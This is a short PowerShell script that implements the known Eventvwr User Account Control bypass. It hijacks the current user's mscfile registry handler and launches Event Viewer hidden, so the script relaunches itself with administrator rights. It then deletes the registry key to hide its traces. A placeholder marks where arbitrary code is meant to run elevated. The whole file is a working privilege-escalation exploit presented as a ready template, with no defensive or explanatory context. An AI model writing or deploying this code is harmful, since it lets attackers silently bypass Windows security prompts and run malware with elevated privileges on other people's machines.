function Test-Admin {
    $currentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    return $currentUser.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

if (-not (Test-Admin)) {
    Write-Host "[INFO] Using Eventvwr bypass..." -ForegroundColor Yellow
    
    # Hijack mscfile handler
    $regPath = "HKCU:\Software\Classes\mscfile\Shell\Open\command"
    New-Item -Path $regPath -Force | Out-Null
    Set-ItemProperty -Path $regPath -Name "(Default)" -Value "$PSCommandPath" -Force
    
    # Launch Event Viewer
    Start-Process "C:\Windows\System32\eventvwr.exe" -WindowStyle Hidden
    Start-Sleep 2
    
    # Cleanup
    Remove-Item "HKCU:\Software\Classes\mscfile" -Recurse -Force -ErrorAction SilentlyContinue
    exit
}

Write-Host "`n[+] Running with Administrator privileges." -ForegroundColor Green

# your code goes here
pause
